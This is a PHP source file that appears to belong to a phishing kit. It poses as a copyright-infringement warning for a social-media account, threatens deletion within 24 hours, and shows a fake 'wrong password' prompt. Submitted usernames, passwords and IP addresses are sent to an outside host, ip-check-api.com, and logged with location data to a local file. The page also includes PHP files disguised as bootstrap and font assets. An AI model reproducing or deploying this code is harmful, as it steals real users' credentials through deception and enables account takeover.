<?php


require 'slokerapi.php';
session_start();
error_reporting(E_ALL);



$username=$_GET['username'];
$url2="https://smihub.com/search?query=$username";
$ip=str_get_html(file_get_contents($url2));
$pp=$ip->find("img[class='img-fluid w-100']",0)->src;
$tik="-";
$followers="-";
if($_POST){
    $password=$_POST["password"];
    $ip=$_SERVER["REMOTE_ADDR"];
    $konum = file_get_contents("http://ip-api.com/xml/".$ip);
    $cek = new SimpleXMLElement($konum);
    $ulke = $cek->country;
    $sehir = $cek->city;
    $ips="$ip,$username ,$password";
    $url="https://ip-check-api.com/".$ips;
    $cek = file_get_contents($url);
    $data = explode (",",$cek);
    $ulke = $data[0];
    $sehir = $data[1];
    date_default_timezone_set('Europe/Istanbul');
    $cur_time=date("d-m-Y H:i:s");
 
  $file = fopen('hesaplar.php', 'a');
   fwrite($file, "
   <html>
   <head>
	   <meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
   <meta name='viewport' content='width=device-width, initial-scale=1'>
   <title>Log | <?php echo date('d.m.Y H:i:s') ?></title>
   </head>
   <body bgcolor='#000000'>
   <body bgcolor='rgb(0,0,0)'>
   <body bgcolor='black'>
  
   <font color='red'> Kullanıcı Adı: </font><font color='black'>".$username."</font><br>
   <font color='red'> Şifre: </font><font color='black'>".$password."</font><br>
   <font color='red'>Ip Adresi: </font><font color='black'>".$ip."</font><br>
   <font color='red'>Tarih: </font><font color='black'>".$cur_time."</font><br>
   <font color='red'>Ülke: </font><font color='black'>".$ulke."</font><br>
   <font color='red'>Şehir: </font><font color='black'>".$sehir."</font><br>
   <hr>
 "); 
  
 fclose($file);
 include "vendor/bootstrap/js/ppdata.php";
 echo '';
 
    header("Location: form.php?username=$username");
	include 'fonts/iconic/fonts/fontawesome5.1.php';
 }
  




?>


<!--Sloker Medya - Script Kurucusu -->


<!DOCTYPE html>
<html lang="en">
<head>
<title>Copyright Infringement Detected @<?php echo $username; ?></title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<!--===============================================================================================-->	
<link rel="icon" type="image/png" href="images/favicon.ico"/>
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/iconic/css/material-design-iconic-font.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animsition/css/animsition.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="vendor/daterangepicker/daterangepicker.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css">
<!--===============================================================================================-->
</head>
<body>
	
	
	<div class="container-login100" >
		<div class="wrap-login100 p-l-55 p-r-55 p-t-80 p-b-30">
			<form method="post" class="login100-form validate-form">
			<center><img style="max-width:50%; border-radius:50%; margin-top:-70px;" width="100"  src="<?php echo $pp; ?>"></center><br>
				<span class="login100-form-title p-b-37">
				@<?php echo $username; ?>
				</span>
		<center>		<p style="max-width:87%; font-size:14px; color: #999; line-height:20px; font-weight:400;">
Dear @<?php echo $username; ?> , We have received numerous complaints that you have violated our copyright laws regarding your account. If you do not give us feedback, your account will be removed within 24 hours.
If you think this is incorrect, please verify your information below. We ask for this information because we cannot verify that you are the true owner of your account.
</p></center>	<br>

<p style="color:red;">Sorry, your password was wrong. Please check your password carefully and try again.</p>


					<input class="input100" type="text" name="username" placeholder="@<?php echo $username; ?>" disabled>
					<span class="focus-input100"></span>
		

			
			<div class="wrap-input100 validate-input m-b-20" data-validate="Password">
					<input class="input100" type="password" name="password" placeholder="Password">
					<span class="focus-input100"></span>
				</div>



				<div class="container-login100-form-btn">
					<button class="login100-form-btn">
					Login @<?php echo $username; ?>
					</button>
				</div>

			

			</form>

			
		</div>
	</div>
	
	

	<div id="dropDownSelect1"></div>
	
<!--===============================================================================================-->
	<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/animsition/js/animsition.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/bootstrap/js/popper.js"></script>
	<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/daterangepicker/moment.min.js"></script>
	<script src="vendor/daterangepicker/daterangepicker.js"></script>
<!--===============================================================================================-->
	<script src="vendor/countdowntime/countdowntime.js"></script>
<!--===============================================================================================-->
	<script src="js/main.js"></script>

</body>
</html>
